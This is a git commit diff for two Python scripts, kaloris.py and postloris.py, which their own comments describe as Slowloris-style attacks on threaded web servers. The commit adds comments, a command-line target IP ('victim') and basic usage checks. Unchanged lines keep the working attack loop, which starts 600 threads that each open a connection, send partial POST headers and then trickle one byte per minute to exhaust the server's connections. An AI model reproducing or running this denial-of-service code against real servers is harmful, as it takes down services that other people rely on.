1b30544c2c43eab6990d43a3aa0f6371d84634cd
Twitch <SixTwelveOhTwo@gmail.com>
2010-07-21 15:01:34 -0700

    Added comments, converted cliargs to variables, and some very basic input syntax verification.

--- kaloris.py
+++ kaloris.py
@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # A Slowloris style attack delivered via HTTP Keep-Alives
 #
-# Ben Sauls
+# Ben 
 
 import sys, socket, time, threading as th, os
 
@@ -18,6 +18,7 @@ kaopen = "GET / HTTP/1.1\r\nHost: kaloris.omnom\r\nUser-Agent: bonk!\r\nConnecti
 msgstart = "POST /index.php HTTP/1.1\r\nHost: slowfox.com\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
 
 class clith(th.Thread):
+	#Open connection and send initial request headers.
 	def run(self):
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
@@ -26,10 +27,13 @@ class clith(th.Thread):
 		time.sleep(.5) # This is necessary to prevent Nagle-like behavior. Surprisingly NODELAY did _not_ do the trick.
 		s.send(msgstart)
 		for b in range(10):
+			# Send the data, byte at a time, to keep the connection threaded.
 			s.send("a")
 			time.sleep(60)
 		s.close()
 
+# Spawn the threads and go insane.
+# I'M GONNA SING THE DOOM SONG NOW!
 for x in xrange(600):
 	clith().start()
 	print "."+str(x)+"."
--- postloris.py
+++ postloris.py
@@ -4,19 +4,24 @@ Postloris is a permutation of the widely publicized 'Slowloris'
 HTTP attacks for threaded web servers.
 ( http://ha.ckers.org/slowloris )
 
-
-Ben Sauls
-
+Ben
 """
 import sys, socket, time, threading as th, os
 
+# Crude Input Validation
+if len(sys.argv) != 2: 
+	sys.stderr.write("        Syntax error! Correct usage:\n%s <target IP> e.g. %s 127.0.0.1\n\n" % (sys.argv[0], sys.argv[0]))
+	sys.exit(2)
+
+#Definitions
+victim = sys.argv[1]
 msgstart = "POST /index.php HTTP/1.1\r\nHost: slowfox.com\r\nContent-Length: 2000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"
 
 class clith(th.Thread):
 	def run(self):
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
-		s.connect((sys.argv[1], 80))
+		s.connect((victim, 80))
 		s.send(msgstart)
 		for b in range(10):
 			s.send("a")
